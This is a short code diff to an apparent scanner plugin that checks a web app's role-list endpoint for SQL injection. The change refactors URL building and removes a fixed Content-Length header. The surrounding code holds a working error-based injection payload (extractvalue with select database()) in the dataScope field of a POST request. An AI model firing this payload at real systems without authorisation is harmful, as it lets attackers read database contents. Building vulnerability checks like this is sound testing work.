@@ -2,7 +2,7 @@
 from plugins.base import PluginBase
 from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
 from lib.colors import ok, no
-from lib.http import host_of
+from lib.http import host_of, join_url
 
 
 class SqlInjectRolePlugin(PluginBase):
@@ -24,7 +24,6 @@ class SqlInjectRolePlugin(PluginBase):
             "Accept-Encoding": "gzip, deflate",
             "Content-Type": "application/x-www-form-urlencoded",
             "X-Requested-With": "XMLHttpRequest",
-            "Content-Length": "181",
             "Origin": "http://{}".format(host),
             "Connection": "close",
             "Referer": "http://{}/system/role".format(host),
@@ -46,7 +45,7 @@ class SqlInjectRolePlugin(PluginBase):
             'params[endTime]': '',
             'params[dataScope]': 'and extractvalue(1,concat(0x7e,(select database()),0x7e))'
         }
-        url = target + '/system/role/list'
+        url = join_url(target, '/system/role/list')
         try:
             sql_inject = session.post(url, headers=headers, data=data).text
         except Exception as e:
